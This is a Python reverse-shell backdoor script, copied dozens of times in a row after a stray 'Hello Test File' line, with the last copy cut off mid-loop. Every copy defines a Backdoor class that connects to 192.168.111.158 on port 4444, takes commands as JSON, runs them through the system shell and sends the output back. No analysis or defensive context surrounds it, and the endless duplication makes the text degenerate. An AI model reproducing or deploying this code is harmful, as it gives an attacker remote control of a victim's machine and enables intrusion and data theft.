Hello Test File#!/usr/bin/env python

import socket
import subprocess
import json

class Backdoor :
    # Send two arguments when creating an object
    # first argument : address family
    # second argument : socket type (TCP connect : socket.SOCK_STREAM
    def __init__(self, ip, port):
        self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.connection.connect((ip, port))
    def execute_system_command(self, command) :
        return subprocess.check_output(command, shell=True)
    def reliable_send(self, data):
        #Changed data type from traditional types to JSON types
        json_data = json.dumps(data)
        self.connection.send(json_data)

    def reliable_receive(self) :
        json_data = ""
        while True :
            try:
                json_data = json_data + self.connection.recv(1024)
                return json.loads(json_data)
            except ValueError :
                continue
    def run(self):
        while True :
            command = self.reliable_receive()
            command_result = self.execute_system_command(command)
            if command_result == "exit" :
                exit()
            self.reliable_send(command_result)
        connection.close()

my_backdoor = Backdoor("192.168.111.158",4444)
my_backdoor.run()
#!/usr/bin/env python

import socket
import subprocess
import json

class Backdoor :
    # Send two arguments when creating an object
    # first argument : address family
    # second argument : socket type (TCP connect : socket.SOCK_STREAM
    def __init__(self, ip, port):
        self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.connection.connect((ip, port))
    def execute_system_command(self, command) :
        return subprocess.check_output(command, shell=True)
    def reliable_send(self, data):
        #Changed data type from traditional types to JSON types
        json_data = json.dumps(data)
        self.connection.send(json_data)

    def reliable_receive(self) :
        json_data = ""
        while True :
            try:
                json_data = json_data + self.connection.recv(1024)
                return json.loads(json_data)
            except ValueError :
                continue
    def run(self):
        while True :
            command = self.reliable_receive()
            command_result = self.execute_system_command(command)
            if command_result == "exit" :
                exit()
            self.reliable_send(command_result)
        connection.close()

my_backdoor = Backdoor("192.168.111.158",4444)
my_backdoor.run()
#!/usr/bin/env python

import socket
import subprocess
import json

class Backdoor :
    # Send two arguments when creating an object
    # first argument : address family
    # second argument : socket type (TCP connect : socket.SOCK_STREAM
    def __init__(self, ip, port):
        self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.connection.connect((ip, port))
    def execute_system_command(self, command) :
        return subprocess.check_output(command, shell=True)
    def reliable_send(self, data):
        #Changed data type from traditional types to JSON types
        json_data = json.dumps(data)
        self.connection.send(json_data)

    def reliable_receive(self) :
        json_data = ""
        while True :
            try:
                json_data = json_data + self.connection.recv(1024)
                return json.loads(json_data)
            except ValueError :
                continue
    def run(self):
        while True :
            command = self.reliable_receive()
            command_result = self.execute_system_command(command)
            if command_result == "exit" :
                exit()
            self.reliable_send(command_result)
        connection.close()

my_backdoor = Backdoor("192.168.111.158",4444)
my_backdoor.run()
#!/usr/bin/env python

import socket
import subprocess
import json

class Backdoor :
    # Send two arguments when creating an object
    # first argument : address family
    # second argument : socket type (TCP connect : socket.SOCK_STREAM
    def __init__(self, ip, port):
        self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.connection.connect((ip, port))
    def execute_system_command(self, command) :
        return subprocess.check_output(command, shell=True)
    def reliable_send(self, data):
        #Changed data type from traditional types to JSON types
        json_data = json.dumps(data)
        self.connection.send(json_data)

    def reliable_receive(self) :
        json_data = ""
        while True :
            try:
                json_data = json_data + self.connection.recv(1024)
                return json.loads(json_data)
            except ValueError :
                continue
    def run(self):
        while True :
            command = self.reliable_receive()
            command_result = self.execute_system_command(command)
            if command_result == "exit" :
                exit()
            self.reliable_send(command_result)
        connection.close()

my_backdoor = Backdoor("192.168.111.158",4444)
my_backdoor.run()
#!/usr/bin/env python

import socket
import subprocess
import json

class Backdoor :
    # Send two arguments when creating an object
    # first argument : address family
    # second argument : socket type (TCP connect : socket.SOCK_STREAM
    def __init__(self, ip, port):
        self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.connection.connect((ip, port))
    def execute_system_command(self, command) :
        return subprocess.check_output(command, shell=True)
    def reliable_send(self, data):
        #Changed data type from traditional types to JSON types
        json_data = json.dumps(data)
        self.connection.send(json_data)

    def reliable_receive(self) :
        json_data = ""
        while True :
            try:
                json_data = json_data + self.connection.recv(1024)
                return json.loads(json_data)
            except ValueError :
                continue
    def run(self):
        while True :
            command = self.reliable_receive()
            command_result = self.execute_system_command(command)
            if command_result == "exit" :
                exit()
            self.reliable_send(command_result)
        connection.close()

my_backdoor = Backdoor("192.168.111.158",4444)
my_backdoor.run()
#!/usr/bin/env python

import socket
import subprocess
import json

class Backdoor :
    # Send two arguments when creating an object
    # first argument : address family
    # second argument : socket type (TCP connect : socket.SOCK_STREAM
    def __init__(self, ip, port):
        self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.connection.connect((ip, port))
    def execute_system_command(self, command) :
        return subprocess.check_output(command, shell=True)
    def reliable_send(self, data):
        #Changed data type from traditional types to JSON types
        json_data = json.dumps(data)
        self.connection.send(json_data)

    def reliable_receive(self) :
        json_data = ""
        while True :
            try:
                json_data = json_data + self.connection.recv(1024)
                return json.loads(json_data)
            except ValueError :
                continue
    def run(self):
        while True :
            command = self.reliable_receive()
            command_result = self.execute_system_command(command)
            if command_result == "exit" :
                exit()
            self.reliable_send(command_result)
        connection.close()

my_backdoor = Backdoor("192.168.111.158",4444)
my_backdoor.run()
#!/usr/bin/env python

import socket
import subprocess
import json

class Backdoor :
    # Send two arguments when creating an object
    # first argument : address family
    # second argument : socket type (TCP connect : socket.SOCK_STREAM
    def __init__(self, ip, port):
        self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.connection.connect((ip, port))
    def execute_system_command(self, command) :
        return subprocess.check_output(command, shell=True)
    def reliable_send(self, data):
        #Changed data type from traditional types to JSON types
        json_data = json.dumps(data)
        self.connection.send(json_data)

    def reliable_receive(self) :
        json_data = ""
        while True :
            try:
                json_data = json_data + self.connection.recv(1024)
                return json.loads(json_data)
            except ValueError :
                continue
    def run(self):
        while True :
            command = self.reliable_receive()
            command_result = self.execute_system_command(command)
            if command_result == "exit" :
                exit()
            self.reliable_send(command_result)
        connection.close()

my_backdoor = Backdoor("192.168.111.158",4444)
my_backdoor.run()
#!/usr/bin/env python

import socket
import subprocess
import json

class Backdoor :
    # Send two arguments when creating an object
    # first argument : address family
    # second argument : socket type (TCP connect : socket.SOCK_STREAM
    def __init__(self, ip, port):
        self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.connection.connect((ip, port))
    def execute_system_command(self, command) :
        return subprocess.check_output(command, shell=True)
    def reliable_send(self, data):
        #Changed data type from traditional types to JSON types
        json_data = json.dumps(data)
        self.connection.send(json_data)

    def reliable_receive(self) :
        json_data = ""
        while True :
            try:
                json_data = json_data + self.connection.recv(1024)
                return json.loads(json_data)
            except ValueError :
                continue
    def run(self):
        while True :
            command = self.reliable_receive()
            command_result = self.execute_system_command(command)
            if command_result == "exit" :
                exit()
            self.reliable_send(command_result)
        connection.close()

my_backdoor = Backdoor("192.168.111.158",4444)
my_backdoor.run()
#!/usr/bin/env python

import socket
import subprocess
import json

class Backdoor :
    # Send two arguments when creating an object
    # first argument : address family
    # second argument : socket type (TCP connect : socket.SOCK_STREAM
    def __init__(self, ip, port):
        self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.connection.connect((ip, port))
    def execute_system_command(self, command) :
        return subprocess.check_output(command, shell=True)
    def reliable_send(self, data):
        #Changed data type from traditional types to JSON types
        json_data = json.dumps(data)
        self.connection.send(json_data)

    def reliable_receive(self) :
        json_data = ""
        while True :
            try:
                json_data = json_data + self.connection.recv(1024)
                return json.loads(json_data)
            except ValueError :
                continue
    def run(self):
        while True :
            command = self.reliable_receive()
            command_result = self.execute_system_command(command)
            if command_result == "exit" :
                exit()
            self.reliable_send(command_result)
        connection.close()

my_backdoor = Backdoor("192.168.111.158",4444)
my_backdoor.run()
#!/usr/bin/env python

import socket
import subprocess
import json

class Backdoor :
    # Send two arguments when creating an object
    # first argument : address family
    # second argument : socket type (TCP connect : socket.SOCK_STREAM
    def __init__(self, ip, port):
        self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.connection.connect((ip, port))
    def execute_system_command(self, command) :
        return subprocess.check_output(command, shell=True)
    def reliable_send(self, data):
        #Changed data type from traditional types to JSON types
        json_data = json.dumps(data)
        self.connection.send(json_data)

    def reliable_receive(self) :
        json_data = ""
        while True :
            try:
                json_data = json_data + self.connection.recv(1024)
                return json.loads(json_data)
            except ValueError :
                continue
    def run(self):
        while True :
            command = self.reliable_receive()
            command_result = self.execute_system_command(command)
            if command_result == "exit" :
                exit()
            self.reliable_send(command_result)
        connection.close()

my_backdoor = Backdoor("192.168.111.158",4444)
my_backdoor.run()
#!/usr/bin/env python

import socket
import subprocess
import json

class Backdoor :
    # Send two arguments when creating an object
    # first argument : address family
    # second argument : socket type (TCP connect : socket.SOCK_STREAM
    def __init__(self, ip, port):
        self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.connection.connect((ip, port))
    def execute_system_command(self, command) :
        return subprocess.check_output(command, shell=True)
    def reliable_send(self, data):
        #Changed data type from traditional types to JSON types
        json_data = json.dumps(data)
        self.connection.send(json_data)

    def reliable_receive(self) :
        json_data = ""
        while True :
            try:
                json_data = json_data + self.connection.recv(1024)
                return json.loads(json_data)
            except ValueError :
                continue
    def run(self):
        while True :
            command = self.reliable_receive()
            command_result = self.execute_system_command(command)
            if command_result == "exit" :
                exit()
            self.reliable_send(command_result)
        connection.close()

my_backdoor = Backdoor("192.168.111.158",4444)
my_backdoor.run()
#!/usr/bin/env python

import socket
import subprocess
import json

class Backdoor :
    # Send two arguments when creating an object
    # first argument : address family
    # second argument : socket type (TCP connect : socket.SOCK_STREAM
    def __init__(self, ip, port):
        self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.connection.connect((ip, port))
    def execute_system_command(self, command) :
        return subprocess.check_output(command, shell=True)
    def reliable_send(self, data):
        #Changed data type from traditional types to JSON types
        json_data = json.dumps(data)
        self.connection.send(json_data)

    def reliable_receive(self) :
        json_data = ""
        while True :
            try:
                json_data = json_data + self.connection.recv(1024)
                return json.loads(json_data)
            except ValueError :
                continue
    def run(self):
        while True :
            command = self.reliable_receive()
            command_result = self.execute_system_command(command)
            if command_result == "exit" :
                exit()
            self.reliable_send(command_result)
        connection.close()

my_backdoor = Backdoor("192.168.111.158",4444)
my_backdoor.run()
#!/usr/bin/env python

import socket
import subprocess
import json

class Backdoor :
    # Send two arguments when creating an object
    # first argument : address family
    # second argument : socket type (TCP connect : socket.SOCK_STREAM
    def __init__(self, ip, port):
        self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.connection.connect((ip, port))
    def execute_system_command(self, command) :
        return subprocess.check_output(command, shell=True)
    def reliable_send(self, data):
        #Changed data type from traditional types to JSON types
        json_data = json.dumps(data)
        self.connection.send(json_data)

    def reliable_receive(self) :
        json_data = ""
        while True :
            try:
                json_data = json_data + self.connection.recv(1024)
                return json.loads(json_data)
            except ValueError :
                continue
    def run(self):
        while True :
            command = self.reliable_receive()
            command_result = self.execute_system_command(command)
            if command_result == "exit" :
                exit()
            self.reliable_send(command_result)
        connection.close()

my_backdoor = Backdoor("192.168.111.158",4444)
my_backdoor.run()
#!/usr/bin/env python

import socket
import subprocess
import json

class Backdoor :
    # Send two arguments when creating an object
    # first argument : address family
    # second argument : socket type (TCP connect : socket.SOCK_STREAM
    def __init__(self, ip, port):
        self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.connection.connect((ip, port))
    def execute_system_command(self, command) :
        return subprocess.check_output(command, shell=True)
    def reliable_send(self, data):
        #Changed data type from traditional types to JSON types
        json_data = json.dumps(data)
        self.connection.send(json_data)

    def reliable_receive(self) :
        json_data = ""
        while True :
            try:
                json_data = json_data + self.connection.recv(1024)
                return json.loads(json_data)
            except ValueError :
                continue
    def run(self):
        while True :
            command = self.reliable_receive()
            command_result = self.execute_system_command(command)
            if command_result == "exit" :
                exit()
            self.reliable_send(command_result)
        connection.close()

my_backdoor = Backdoor("192.168.111.158",4444)
my_backdoor.run()
#!/usr/bin/env python

import socket
import subprocess
import json

class Backdoor :
    # Send two arguments when creating an object
    # first argument : address family
    # second argument : socket type (TCP connect : socket.SOCK_STREAM
    def __init__(self, ip, port):
        self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.connection.connect((ip, port))
    def execute_system_command(self, command) :
        return subprocess.check_output(command, shell=True)
    def reliable_send(self, data):
        #Changed data type from traditional types to JSON types
        json_data = json.dumps(data)
        self.connection.send(json_data)

    def reliable_receive(self) :
        json_data = ""
        while True :
            try:
                json_data = json_data + self.connection.recv(1024)
                return json.loads(json_data)
            except ValueError :
                continue
    def run(self):
        while True :
            command = self.reliable_receive()
            command_result = self.execute_system_command(command)
            if command_result == "exit" :
                exit()
            self.reliable_send(command_result)
        connection.close()

my_backdoor = Backdoor("192.168.111.158",4444)
my_backdoor.run()
#!/usr/bin/env python

import socket
import subprocess
import json

class Backdoor :
    # Send two arguments when creating an object
    # first argument : address family
    # second argument : socket type (TCP connect : socket.SOCK_STREAM
    def __init__(self, ip, port):
        self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.connection.connect((ip, port))
    def execute_system_command(self, command) :
        return subprocess.check_output(command, shell=True)
    def reliable_send(self, data):
        #Changed data type from traditional types to JSON types
        json_data = json.dumps(data)
        self.connection.send(json_data)

    def reliable_receive(self) :
        json_data = ""
        while True :
            try:
                json_data = json_data + self.connection.recv(1024)
                return json.loads(json_data)
            except ValueError :
                continue
    def run(self):
        while True :
            command = self.reliable_receive()
            command_result = self.execute_system_command(command)
            if command_result == "exit" :
                exit()
            self.reliable_send(command_result)
        connection.close()

my_backdoor = Backdoor("192.168.111.158",4444)
my_backdoor.run()
#!/usr/bin/env python

import socket
import subprocess
import json

class Backdoor :
    # Send two arguments when creating an object
    # first argument : address family
    # second argument : socket type (TCP connect : socket.SOCK_STREAM
    def __init__(self, ip, port):
        self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.connection.connect((ip, port))
    def execute_system_command(self, command) :
        return subprocess.check_output(command, shell=True)
    def reliable_send(self, data):
        #Changed data type from traditional types to JSON types
        json_data = json.dumps(data)
        self.connection.send(json_data)

    def reliable_receive(self) :
        json_data = ""
        while True :
            try:
                json_data = json_data + self.connection.recv(1024)
                return json.loads(json_data)
            except ValueError :
                continue
    def run(self):
        while True :
            command = self.reliable_receive()
            command_result = self.execute_system_command(command)
            if command_result == "exit" :
                exit()
            self.reliable_send(command_result)
        connection.close()

my_backdoor = Backdoor("192.168.111.158",4444)
my_backdoor.run()
#!/usr/bin/env python

import socket
import subprocess
import json

class Backdoor :
    # Send two arguments when creating an object
    # first argument : address family
    # second argument : socket type (TCP connect : socket.SOCK_STREAM
    def __init__(self, ip, port):
        self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.connection.connect((ip, port))
    def execute_system_command(self, command) :
        return subprocess.check_output(command, shell=True)
    def reliable_send(self, data):
        #Changed data type from traditional types to JSON types
        json_data = json.dumps(data)
        self.connection.send(json_data)

    def reliable_receive(self) :
        json_data = ""
        while True :
            try:
                json_data = json_data + self.connection.recv(1024)
                return json.loads(json_data)
            except ValueError :
                continue
    def run(self):
        while True :
            command = self.reliable_receive()
            command_result = self.execute_system_command(command)
            if command_result == "exit" :
                exit()
            self.reliable_send(command_result)
        connection.close()

my_backdoor = Backdoor("192.168.111.158",4444)
my_backdoor.run()
#!/usr/bin/env python

import socket
import subprocess
import json

class Backdoor :
    # Send two arguments when creating an object
    # first argument : address family
    # second argument : socket type (TCP connect : socket.SOCK_STREAM
    def __init__(self, ip, port):
        self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.connection.connect((ip, port))
    def execute_system_command(self, command) :
        return subprocess.check_output(command, shell=True)
    def reliable_send(self, data):
        #Changed data type from traditional types to JSON types
        json_data = json.dumps(data)
        self.connection.send(json_data)

    def reliable_receive(self) :
        json_data = ""
        while True :
            try:
                json_data = json_data + self.connection.recv(1024)
                return json.loads(json_data)
            except ValueError :
                continue
    def run(self):
        while True :
            command = self.reliable_receive()
            command_result = self.execute_system_command(command)
            if command_result == "exit" :
                exit()
            self.reliable_send(command_result)
        connection.close()

my_backdoor = Backdoor("192.168.111.158",4444)
my_backdoor.run()
#!/usr/bin/env python

import socket
import subprocess
import json

class Backdoor :
    # Send two arguments when creating an object
    # first argument : address family
    # second argument : socket type (TCP connect : socket.SOCK_STREAM
    def __init__(self, ip, port):
        self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.connection.connect((ip, port))
    def execute_system_command(self, command) :
        return subprocess.check_output(command, shell=True)
    def reliable_send(self, data):
        #Changed data type from traditional types to JSON types
        json_data = json.dumps(data)
        self.connection.send(json_data)

    def reliable_receive(self) :
        json_data = ""
        while True :
            try:
                json_data = json_data + self.connection.recv(1024)
                return json.loads(json_data)
            except ValueError :
                continue
    def run(self):
        while True :
            command = self.reliable_receive()
            command_result = self.execute_system_command(command)
            if command_result == "exit" :
                exit()
            self.reliable_send(command_result)
        connection.close()

my_backdoor = Backdoor("192.168.111.158",4444)
my_backdoor.run()
#!/usr/bin/env python

import socket
import subprocess
import json

class Backdoor :
    # Send two arguments when creating an object
    # first argument : address family
    # second argument : socket type (TCP connect : socket.SOCK_STREAM
    def __init__(self, ip, port):
        self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.connection.connect((ip, port))
    def execute_system_command(self, command) :
        return subprocess.check_output(command, shell=True)
    def reliable_send(self, data):
        #Changed data type from traditional types to JSON types
        json_data = json.dumps(data)
        self.connection.send(json_data)

    def reliable_receive(self) :
        json_data = ""
        while True :
            try:
                json_data = json_data + self.connection.recv(1024)
                return json.loads(json_data)
            except ValueError :
                continue
    def run(self):
        while True :
            command = self.reliable_receive()
            command_result = self.execute_system_command(command)
            if command_result == "exit" :
                exit()
            self.reliable_send(command_result)
        connection.close()

my_backdoor = Backdoor("192.168.111.158",4444)
my_backdoor.run()
#!/usr/bin/env python

import socket
import subprocess
import json

class Backdoor :
    # Send two arguments when creating an object
    # first argument : address family
    # second argument : socket type (TCP connect : socket.SOCK_STREAM
    def __init__(self, ip, port):
        self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.connection.connect((ip, port))
    def execute_system_command(self, command) :
        return subprocess.check_output(command, shell=True)
    def reliable_send(self, data):
        #Changed data type from traditional types to JSON types
        json_data = json.dumps(data)
        self.connection.send(json_data)

    def reliable_receive(self) :
        json_data = ""
        while True :
            try:
                json_data = json_data + self.connection.recv(1024)
                return json.loads(json_data)
            except ValueError :
                continue
    def run(self):
        while True :
            command = self.reliable_receive()
            command_result = self.execute_system_command(command)
            if command_result == "exit" :
                exit()
            self.reliable_send(command_result)
        connection.close()

my_backdoor = Backdoor("192.168.111.158",4444)
my_backdoor.run()
#!/usr/bin/env python

import socket
import subprocess
import json

class Backdoor :
    # Send two arguments when creating an object
    # first argument : address family
    # second argument : socket type (TCP connect : socket.SOCK_STREAM
    def __init__(self, ip, port):
        self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.connection.connect((ip, port))
    def execute_system_command(self, command) :
        return subprocess.check_output(command, shell=True)
    def reliable_send(self, data):
        #Changed data type from traditional types to JSON types
        json_data = json.dumps(data)
        self.connection.send(json_data)

    def reliable_receive(self) :
        json_data = ""
        while True :
            try:
                json_data = json_data + self.connection.recv(1024)
                return json.loads(json_data)
            except ValueError :
                continue
    def run(self):
        while True :
            command = self.reliable_receive()
            command_result = self.execute_system_command(command)
            if command_result == "exit" :
                exit()
            self.reliable_send(command_result)
        connection.close()

my_backdoor = Backdoor("192.168.111.158",4444)
my_backdoor.run()
#!/usr/bin/env python

import socket
import subprocess
import json

class Backdoor :
    # Send two arguments when creating an object
    # first argument : address family
    # second argument : socket type (TCP connect : socket.SOCK_STREAM
    def __init__(self, ip, port):
        self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.connection.connect((ip, port))
    def execute_system_command(self, command) :
        return subprocess.check_output(command, shell=True)
    def reliable_send(self, data):
        #Changed data type from traditional types to JSON types
        json_data = json.dumps(data)
        self.connection.send(json_data)

    def reliable_receive(self) :
        json_data = ""
        while True :
            try:
                json_data = json_data + self.connection.recv(1024)
                return json.loads(json_data)
            except ValueError :
                continue
    def run(self):
        while True :
            command = self.reliable_receive()
            command_result = self.execute_system_command(command)
            if command_result == "exit" :
                exit()
            self.reliable_send(command_result)
        connection.close()

my_backdoor = Backdoor("192.168.111.158",4444)
my_backdoor.run()
#!/usr/bin/env python

import socket
import subprocess
import json

class Backdoor :
    # Send two arguments when creating an object
    # first argument : address family
    # second argument : socket type (TCP connect : socket.SOCK_STREAM
    def __init__(self, ip, port):
        self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.connection.connect((ip, port))
    def execute_system_command(self, command) :
        return subprocess.check_output(command, shell=True)
    def reliable_send(self, data):
        #Changed data type from traditional types to JSON types
        json_data = json.dumps(data)
        self.connection.send(json_data)

    def reliable_receive(self) :
        json_data = ""
        while True :
            try:
                json_data = json_data + self.connection.recv(1024)
                return json.loads(json_data)
            except ValueError :
                continue
    def run(self):
        while True :
            command = self.reliable_receive()
            command_result = self.execute_system_command(command)
            if command_result == "exit" :
                exit()
            self.reliable_send(command_result)
        connection.close()

my_backdoor = Backdoor("192.168.111.158",4444)
my_backdoor.run()
#!/usr/bin/env python

import socket
import subprocess
import json

class Backdoor :
    # Send two arguments when creating an object
    # first argument : address family
    # second argument : socket type (TCP connect : socket.SOCK_STREAM
    def __init__(self, ip, port):
        self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.connection.connect((ip, port))
    def execute_system_command(self, command) :
        return subprocess.check_output(command, shell=True)
    def reliable_send(self, data):
        #Changed data type from traditional types to JSON types
        json_data = json.dumps(data)
        self.connection.send(json_data)

    def reliable_receive(self) :
        json_data = ""
        while True :
            try:
                json_data = json_data + self.connection.recv(1024)
                return json.loads(json_data)
            except ValueError :
                continue
    def run(self):
        while True :
            command = self.reliable_receive()
            command_result = self.execute_system_command(command)
            if command_result == "exit" :
                exit()
            self.reliable_send(command_result)
        connection.close()

my_backdoor = Backdoor("192.168.111.158",4444)
my_backdoor.run()
#!/usr/bin/env python

import socket
import subprocess
import json

class Backdoor :
    # Send two arguments when creating an object
    # first argument : address family
    # second argument : socket type (TCP connect : socket.SOCK_STREAM
    def __init__(self, ip, port):
        self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.connection.connect((ip, port))
    def execute_system_command(self, command) :
        return subprocess.check_output(command, shell=True)
    def reliable_send(self, data):
        #Changed data type from traditional types to JSON types
        json_data = json.dumps(data)
        self.connection.send(json_data)

    def reliable_receive(self) :
        json_data = ""
        while True :
            try:
                json_data = json_data + self.connection.recv(1024)
                return json.loads(json_data)
            except ValueError :
                continue
    def run(self):
        while True :
            command = self.reliable_receive()
            command_result = self.execute_system_command(command)
            if command_result == "exit" :
                exit()
            self.reliable_send(command_result)
        connection.close()

my_backdoor = Backdoor("192.168.111.158",4444)
my_backdoor.run()
#!/usr/bin/env python

import socket
import subprocess
import json

class Backdoor :
    # Send two arguments when creating an object
    # first argument : address family
    # second argument : socket type (TCP connect : socket.SOCK_STREAM
    def __init__(self, ip, port):
        self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.connection.connect((ip, port))
    def execute_system_command(self, command) :
        return subprocess.check_output(command, shell=True)
    def reliable_send(self, data):
        #Changed data type from traditional types to JSON types
        json_data = json.dumps(data)
        self.connection.send(json_data)

    def reliable_receive(self) :
        json_data = ""
        while True :
            try:
                json_data = json_data + self.connection.recv(1024)
                return json.loads(json_data)
            except ValueError :
                continue
    def run(self):
        while True :
            command = self.reliable_receive()
            command_result = self.execute_system_command(command)
            if command_result == "exit" :
                exit()
            self.reliable_send(command_result)
        connection.close()

my_backdoor = Backdoor("192.168.111.158",4444)
my_backdoor.run()
#!/usr/bin/env python

import socket
import subprocess
import json

class Backdoor :
    # Send two arguments when creating an object
    # first argument : address family
    # second argument : socket type (TCP connect : socket.SOCK_STREAM
    def __init__(self, ip, port):
        self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.connection.connect((ip, port))
    def execute_system_command(self, command) :
        return subprocess.check_output(command, shell=True)
    def reliable_send(self, data):
        #Changed data type from traditional types to JSON types
        json_data = json.dumps(data)
        self.connection.send(json_data)

    def reliable_receive(self) :
        json_data = ""
        while True :
            try:
                json_data = json_data + self.connection.recv(1024)
                return json.loads(json_data)
            except ValueError :
                continue
    def run(self):
        while True :
            command = self.reliable_receive()
            command_result = self.execute_system_command(command)
            if command_result == "exit" :
                exit()
            self.reliable_send(command_result)
        connection.close()

my_backdoor = Backdoor("192.168.111.158",4444)
my_backdoor.run()
#!/usr/bin/env python

import socket
import subprocess
import json

class Backdoor :
    # Send two arguments when creating an object
    # first argument : address family
    # second argument : socket type (TCP connect : socket.SOCK_STREAM
    def __init__(self, ip, port):
        self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.connection.connect((ip, port))
    def execute_system_command(self, command) :
        return subprocess.check_output(command, shell=True)
    def reliable_send(self, data):
        #Changed data type from traditional types to JSON types
        json_data = json.dumps(data)
        self.connection.send(json_data)

    def reliable_receive(self) :
        json_data = ""
        while True :
            try:
                json_data = json_data + self.connection.recv(1024)
                return json.loads(json_data)
            except ValueError :
                continue
    def run(self):
        while True :
            command = self.reliable_receive()
            command_result = self.execute_system_command(command)
            if command_result == "exit" :
                exit()
            self.reliable_send(command_result)
        connection.close()

my_backdoor = Backdoor("192.168.111.158",4444)
my_backdoor.run()
#!/usr/bin/env python

import socket
import subprocess
import json

class Backdoor :
    # Send two arguments when creating an object
    # first argument : address family
    # second argument : socket type (TCP connect : socket.SOCK_STREAM
    def __init__(self, ip, port):
        self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.connection.connect((ip, port))
    def execute_system_command(self, command) :
        return subprocess.check_output(command, shell=True)
    def reliable_send(self, data):
        #Changed data type from traditional types to JSON types
        json_data = json.dumps(data)
        self.connection.send(json_data)

    def reliable_receive(self) :
        json_data = ""
        while True :
            try:
                json_data = json_data + self.connection.recv(1024)
                return json.loads(json_data)
            except ValueError :
                continue
    def run(self):
        while True :
            command = self.reliable_receive()
            command_result = self.execute_system_command(command)
            if command_result == "exit" :
                exit()
            self.reliable_send(command_result)
        connection.close()

my_backdoor = Backdoor("192.168.111.158",4444)
my_backdoor.run()
#!/usr/bin/env python

import socket
import subprocess
import json

class Backdoor :
    # Send two arguments when creating an object
    # first argument : address family
    # second argument : socket type (TCP connect : socket.SOCK_STREAM
    def __init__(self, ip, port):
        self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.connection.connect((ip, port))
    def execute_system_command(self, command) :
        return subprocess.check_output(command, shell=True)
    def reliable_send(self, data):
        #Changed data type from traditional types to JSON types
        json_data = json.dumps(data)
        self.connection.send(json_data)

    def reliable_receive(self) :
        json_data = ""
        while True :
            try:
                json_data = json_data + self.connection.recv(1024)
                return json.loads(json_data)
            except ValueError :
                continue
    def run(self):
        while True :
            command = self.reliable_receive()
            command_result = self.execute_system_command(command)
            if command_result == "exit" :
                exit()
            self.reliable_send(command_result)
        connection.close()

my_backdoor = Backdoor("192.168.111.158",4444)
my_backdoor.run()
#!/usr/bin/env python

import socket
import subprocess
import json

class Backdoor :
    # Send two arguments when creating an object
    # first argument : address family
    # second argument : socket type (TCP connect : socket.SOCK_STREAM
    def __init__(self, ip, port):
        self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.connection.connect((ip, port))
    def execute_system_command(self, command) :
        return subprocess.check_output(command, shell=True)
    def reliable_send(self, data):
        #Changed data type from traditional types to JSON types
        json_data = json.dumps(data)
        self.connection.send(json_data)

    def reliable_receive(self) :
        json_data = ""
        while True :
            try:
                json_data = json_data + self.connection.recv(1024)
                return json.loads(json_data)
            except ValueError :
                continue
    def run(self):
        while True :
            command = self.reliable_receive()
            command_result = self.execute_system_command(command)
            if command_result == "exit" :
                exit()
            self.reliable_send(command_result)
        connection.close()

my_backdoor = Backdoor("192.168.111.158",4444)
my_backdoor.run()
#!/usr/bin/env python

import socket
import subprocess
import json

class Backdoor :
    # Send two arguments when creating an object
    # first argument : address family
    # second argument : socket type (TCP connect : socket.SOCK_STREAM
    def __init__(self, ip, port):
        self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.connection.connect((ip, port))
    def execute_system_command(self, command) :
        return subprocess.check_output(command, shell=True)
    def reliable_send(self, data):
        #Changed data type from traditional types to JSON types
        json_data = json.dumps(data)
        self.connection.send(json_data)

    def reliable_receive(self) :
        json_data = ""
        while True :
            try:
                json_data = json_data + self.connection.recv(1024)
                return json.loads(json_data)
            except ValueError :
                continue
    def run(self):
        while True :
            command = self.reliable_receive()
            command_result = self.execute_system_command(command)
            if command_result == "exit" :
                exit()
            self.reliable_send(command_result)
        connection.close()

my_backdoor = Backdoor("192.168.111.158",4444)
my_backdoor.run()
#!/usr/bin/env python

import socket
import subprocess
import json

class Backdoor :
    # Send two arguments when creating an object
    # first argument : address family
    # second argument : socket type (TCP connect : socket.SOCK_STREAM
    def __init__(self, ip, port):
        self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.connection.connect((ip, port))
    def execute_system_command(self, command) :
        return subprocess.check_output(command, shell=True)
    def reliable_send(self, data):
        #Changed data type from traditional types to JSON types
        json_data = json.dumps(data)
        self.connection.send(json_data)

    def reliable_receive(self) :
        json_data = ""
        while True :
            try:
                json_data = json_data + self.connection.recv(1024)
                return json.loads(json_data)
            except ValueError :
                continue
    def run(self):
        while True :
